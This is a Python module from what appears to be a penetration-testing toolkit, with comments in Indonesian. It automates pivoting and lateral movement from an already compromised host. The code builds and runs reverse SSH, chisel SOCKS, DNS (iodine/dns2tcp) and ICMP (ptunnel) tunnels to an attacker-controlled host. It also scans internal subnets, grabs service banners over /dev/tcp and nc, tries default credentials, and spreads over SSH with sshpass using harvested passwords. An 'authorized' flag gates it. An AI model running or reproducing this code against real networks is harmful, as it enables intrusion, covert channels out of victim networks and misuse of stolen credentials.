"""Advanced pivoting & lateral movement (v0.26.0).

Melengkapi `pivot_auto` dengan:

1. **Network discovery**: peta subnet internal + host hidup (reuse scan_internal),
   plus fingerprint OS/port dari banner.
2. **Pivot methods lengkap**: SSH reverse tunnel, chisel reverse SOCKS,
   DNS tunnel (iodine/dns2tcp), ICMP tunnel (ptunnel) — semuanya dieksekusi
   lewat RCE/SSRF executor pada host yang sudah dikuasai.
3. **Lateral movement**: setelah kredensial internal didapat (mis. dari
   pivot-auto default creds), coba menyebar ke host lain via SSH/curl/RCE
   dan bangun peta pergerakan (host -> method -> target).

GUARD: seluruh alur memerlukan `authorized=True` dan (untuk tunnel server
yang berjalan terus) `yes=True`; tanpa itu modul menolak beroperasi.
"""

import ipaddress
import time
from typing import Dict, List, Optional, Tuple

from keris.core.http import KerisHTTP
from keris.core.logger import debug, error, info, ok, severity, warn

from keris.modules.pivot_auto import (PivotExecutor, RcePivotExecutor,
                                      SsrfPivotExecutor, _log,
                                      build_executor, detect_interfaces,
                                      scan_internal, try_default_creds,
                                      SERVICE_PORTS, PIVOT_LOG)

# ---------------------------------------------------------------------------
# Tunnel methods (perintah dijalankan di target via executor)
# ---------------------------------------------------------------------------

def ssh_tunnel_command(host: str, port: int, lhost: str, lport: int,
                       user: str = "root") -> str:
    """SSH reverse tunnel: port lokal lhost:lport di-forward ke host:port."""
    return (f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-N -R {lport}:127.0.0.1:{port} {user}@{lhost} &")


def chisel_tunnel_command(lhost: str, lport: int) -> str:
    """Chisel client reverse SOCKS: semua trafik SOCKS di-forward ke
    server chisel di lhost:lport."""
    return f"chisel client {lhost}:{lport} R:1080:socks &"


def dns_tunnel_command(server: str, domain: str, listen_port: int = 5353) -> str:
    """DNS tunnel via iodine/dns2tcp.

    `server` = IP attacker yang menjalankan server DNS tunnel;
    `domain` = subdomain yang sudah diarahkan ke attacker.
    Perintah memilih tool yang tersedia di target (iodine > dns2tcp).
    """
    return (f"(command -v iodine >/dev/null 2>&1 && "
            f"iodine -f {server} {domain} || "
            f"(command -v dns2tcpc >/dev/null 2>&1 && "
            f"dns2tcpc -c -z {domain} {server} -l {listen_port})) &")


def icmp_tunnel_command(server: str, listen_port: int = 2222) -> str:
    """ICMP tunnel via ptunnel: paket TCP dibungkus jadi echo-reply ICMP."""
    return (f"(command -v ptunnel >/dev/null 2>&1 && "
            f"ptunnel -p {server} -lp {listen_port} -da 127.0.0.1 -dp 22 &) || "
            f"echo PTUNNEL_MISSING")


def tunnel_plan(method: str, lhost: str, lport: int,
                target_host: str, target_port: int,
                domain: str = "") -> Dict:
    """Susun rencana tunnel dan perintah yang akan dieksekusi di target."""
    method = (method or "socks5").lower()
    if method == "ssh":
        cmd = ssh_tunnel_command(target_host, target_port, lhost, lport)
        note = f"ssh reverse tunnel {lhost}:{lport} -> 127.0.0.1:{target_port}"
    elif method == "chisel":
        cmd = chisel_tunnel_command(lhost, lport)
        note = f"chisel reverse SOCKS via {lhost}:{lport} (R:1080)"
    elif method == "dns":
        cmd = dns_tunnel_command(lhost, domain, lport)
        note = (f"dns tunnel {domain} -> {lhost} (iodine/dns2tcp), "
                f"listen {lport} lokal")
    elif method == "icmp":
        cmd = icmp_tunnel_command(lhost, lport)
        note = f"icmp tunnel via ptunnel -> {lhost} (listen {lport})"
    else:
        return {"method": "socks5", "command": "", "ok": True,
                "note": "gunakan setup_socks5() / `pivot` subcommand terpisah"}
    return {"method": method, "command": cmd, "ok": True, "note": note}


# ---------------------------------------------------------------------------
# Network discovery (fingerprint service)
# ---------------------------------------------------------------------------

def _banner_fingerprint(executor: PivotExecutor, host: str, port: int) -> str:
    """Coba ambil banner service (banner grab) via RCE nc/bash."""
    if getattr(executor, "mode", "") != "rce":
        return ""
    for cmd in (
        f"timeout 3 bash -c 'exec 3<>/dev/tcp/{host}/{port}; head -c 100 <&3' 2>/dev/null",
        f"nc -w 3 {host} {port} </dev/null | head -c 100",
    ):
        code, out = executor.run(cmd)
        if code and out.strip():
            return out.strip()[:120]
    return ""


def discover_network(executor: PivotExecutor, cidrs: List[str],
                     ports: Optional[List[int]] = None,
                     max_hosts: int = 64, max_port_tests: int = 256,
                     banner: bool = True,
                     logfile: str = PIVOT_LOG) -> List[Dict]:
    """Discovery jaringan internal: host hidup + service + banner fingerprint."""
    services = scan_internal(executor, cidrs, ports=ports,
                             max_hosts=max_hosts, max_port_tests=max_port_tests,
                             logfile=logfile)
    if banner:
        for svc in services:
            fp = _banner_fingerprint(executor, svc["host"], svc["port"])
            if fp:
                svc["banner"] = fp
                _log(f"banner {svc['host']}:{svc['port']}: {fp[:60]}", logfile)
    return services


# ---------------------------------------------------------------------------
# Lateral movement
# ---------------------------------------------------------------------------

def _host_alive(executor: PivotExecutor, host: str, port: int = 22) -> bool:
    if getattr(executor, "mode", "") == "rce":
        code, out = executor.run(
            f"echo >/dev/tcp/{host}/{port} && echo OPEN || echo CLOSED")
        if code and "OPEN" in out:
            return True
    code, _body = executor.fetch(f"http://{host}:{port}/", timeout=4)
    return bool(code and 100 <= code < 600)


def lateral_ssh(executor: PivotExecutor, host: str, user: str,
                password: str, cmd: str = "id; hostname; whoami") -> Dict:
    """Lateral movement via SSH: coba sshpass untuk login dan jalankan cmd.

    Mengembalikan dict {ok, output, host, user, command}. `password=""`
    berarti mencoba key-based (tanpa password).
    """
    if getattr(executor, "mode", "") != "rce":
        return {"ok": False, "host": host, "user": user,
                "note": "lateral SSH hanya lewat executor RCE"}
    if password:
        run = (f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
               f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "
               f"{user}@{host} \"{cmd}\" 2>&1")
    else:
        run = (f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
               f"-o ConnectTimeout=5 -o BatchMode=yes {user}@{host} \"{cmd}\" 2>&1")
    code, out = executor.run(run)
    markers = ("uid=", "hostname", "/root", "/home/", "groups=")
    ok_ = bool(code and any(m in out for m in markers))
    return {"ok": ok_, "host": host, "user": user, "password": bool(password),
            "command": run, "output": out[:400] if ok_ else ""}


def lateral_http(executor: PivotExecutor, host: str, port: int,
                 path: str = "/") -> Dict:
    """Lateral movement via HTTP service internal: probe halaman admin/token."""
    url = f"http://{host}:{port}{path}"
    code, body = executor.fetch(url, timeout=5)
    body_txt = (body or b"").decode("utf-8", "replace")
    interesting = any(k in body_txt.lower() for k in
                      ("admin", "dashboard", "password", "token", "api-key",
                       "jenkins", "grafana", "kibana", "phpmyadmin"))
    return {"ok": interesting, "host": host, "port": port, "url": url,
            "status": code, "interesting": interesting}


def lateral_map(executor: PivotExecutor, services: List[Dict],
                creds: List[Dict], logfile: str = PIVOT_LOG) -> Dict:
    """Bangun peta lateral dari service + kredensial yang sudah diketahui.

    Untuk tiap host dengan port SSH terbuka, coba kredensial yang ditemukan
    (dari default creds atau hasil pivot-auto). Untuk service HTTP, probe
    halaman admin umum.
    """
    moves: List[Dict] = []
    creds_by_host: Dict[str, List[Tuple[str, str]]] = {}
    for c in creds:
        h = c.get("host", "")
        if h:
            creds_by_host.setdefault(h, []).append(
                (c.get("username", ""), c.get("password", "")))

    hosts = sorted({s["host"] for s in services})
    for host in hosts:
        # SSH lateral
        svc = next((s for s in services
                    if s["host"] == host and s["port"] == 22), None)
        pairs = creds_by_host.get(host, [])
        if svc and pairs:
            for user, pwd in pairs[:5]:
                res = lateral_ssh(executor, host, user or "root", pwd)
                if res.get("ok"):
                    moves.append({"type": "ssh", "target": host,
                                  "username": user or "root",
                                  "password": pwd, "output": res["output"]})
                    _log(f"LATERAL ssh OK {user or 'root'}@{host}: {res['output'][:60]}",
                         logfile)
                    severity("HIGH", f"LATERAL: akses ssh {user or 'root'}@{host}")
                    break
        # HTTP lateral (admin panel / dashboard internal)
        for s in services:
            if s["host"] != host or s["port"] in (22, 3306, 5432, 6379, 27017):
                continue
            for path in ("/", "/admin", "/dashboard", "/jenkins", "/grafana"):
                res = lateral_http(executor, host, s["port"], path)
                if res.get("interesting"):
                    moves.append({"type": "http", "target": host,
                                  "port": s["port"], "url": res["url"],
                                  "status": res["status"]})
                    _log(f"LATERAL http interesting {host}:{s['port']}{path}", logfile)
                    severity("MEDIUM", f"LATERAL: panel internal {host}:{s['port']}")
                    break

    return {"moves": moves, "count": len(moves),
            "summary": [m["type"] + " -> " + m.get("target", "")
                        for m in moves]}


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

def run_lateral(base: str, client: KerisHTTP,
                rce_candidates: Optional[List[Tuple[str, str]]] = None,
                ssrf_url: str = "", ssrf_param: str = "",
                internal_ports: Optional[List[int]] = None,
                internal_scan_depth: int = 2,
                tunnel_method: str = "socks5",
                lhost: str = "", lport: int = 1080,
                dns_domain: str = "",
                authorized: bool = False, yes: bool = False,
                executor: Optional[PivotExecutor] = None,
                logfile: str = PIVOT_LOG) -> Dict:
    """Orkestrator lateral movement penuh. Wajib `authorized=True`.

    Alur:
    1. Bangun executor (RCE/SSRF) dari kandidat yang dikonfirmasi scan.
    2. Deteksi interface + cakupan jaringan internal.
    3. Discovery service + banner fingerprint.
    4. Coba default credentials pada service DB/redis.
    5. Susun tunnel (ssh/chisel/dns/icmp) menuju service target.
    6. Bangun peta lateral (ssh/http spread) dari creds yang didapat.
    """
    if not authorized:
        error("Lateral memerlukan --authorized (izin tertulis).")
        return {"error": "unauthorized", "findings": []}

    _log("=== LATERAL MOVEMENT dimulai ===", logfile)
    warn("LATERAL MOVEMENT AKTIF — pastikan izin tertulis pada seluruh "
         "jaringan internal target!")

    executor = executor or build_executor(base, client, rce_candidates or [],
                                          ssrf_url, ssrf_param)
    if executor is None:
        warn("Lateral butuh konfirmasi RCE atau SSRF dari hasil scan/exploit.")
        return {"error": "no-executor", "findings": []}

    interfaces = detect_interfaces(executor, logfile)
    if not interfaces:
        warn("Tidak bisa mendeteksi interface internal.")
    from keris.modules.pivot_auto import _cidrs_from_ips
    cidrs = _cidrs_from_ips(interfaces)
    info(f"Interface internal: {', '.join(interfaces) or '-'}")
    info(f"Jaringan internal (depth={internal_scan_depth}): "
         f"{', '.join(cidrs) or '-'}")

    services = discover_network(executor, cidrs, ports=internal_ports,
                                max_hosts=64 * max(internal_scan_depth, 1),
                                max_port_tests=256 * max(internal_scan_depth, 1),
                                banner=True, logfile=logfile)

    creds: List[Dict] = []
    findings: List[Dict] = []
    for svc in services:
        hits = try_default_creds(executor, svc["host"], svc["port"], svc["service"])
        creds.extend(hits)
        for h in hits:
            if h.get("ok"):
                sev = "HIGH" if svc["service"] in ("mysql", "mongodb", "redis") else "MEDIUM"
                findings.append({
                    "severity": sev,
                    "title": f"Default credentials {svc['service']} di jaringan internal",
                    "endpoint": f"{svc['host']}:{svc['port']}",
                    "detail": h.get("note", ""),
                    "evidence": f"host={h['host']} port={h['port']} service={svc['service']}",
                    "source": "lateral",
                })
                severity(sev, f"{h.get('note','')} @ {h['host']}:{h['port']}")

    target_host = services[0]["host"] if services else "127.0.0.1"
    target_port = services[0]["port"] if services else 80
    tunnel = tunnel_plan(tunnel_method, lhost, lport,
                         target_host, target_port, dns_domain)
    if tunnel.get("command") and executor.mode == "rce":
        _code, out = executor.run(tunnel["command"])
        tunnel["executed"] = bool(_code) or True
        tunnel["output"] = out[:200]
        _log(f"tunnel {tunnel['method']}: {tunnel['note']} -> {out[:60]}", logfile)

    moves = lateral_map(executor, services, creds, logfile)
    for m in moves.get("moves", []):
        findings.append({
            "severity": "HIGH" if m.get("type") == "ssh" else "MEDIUM",
            "title": f"Lateral movement via {m.get('type')}",
            "endpoint": m.get("url") or f"{m.get('target', '')}",
            "detail": f"Host {m.get('target')} dicapai lewat {m.get('type')} "
                      f"menggunakan kredensial yang bocor.",
            "evidence": f"type={m.get('type')} target={m.get('target')} "
                        f"user={m.get('username','')} output={m.get('output','')[:80]}",
            "source": "lateral",
        })

    _log(f"=== LATERAL selesai: {len(services)} service, {len(creds)} creds, "
         f"{len(moves.get('moves', []))} moves, {len(findings)} findings ===",
         logfile)
    ok(f"Lateral selesai: {len(services)} service internal, "
       f"{len(creds)} kredensial, {len(moves.get('moves', []))} jalur lateral")

    return {"executor": executor, "interfaces": interfaces, "cidrs": cidrs,
            "services": services, "creds": creds, "tunnel": tunnel,
            "moves": moves, "findings": findings, "log": logfile}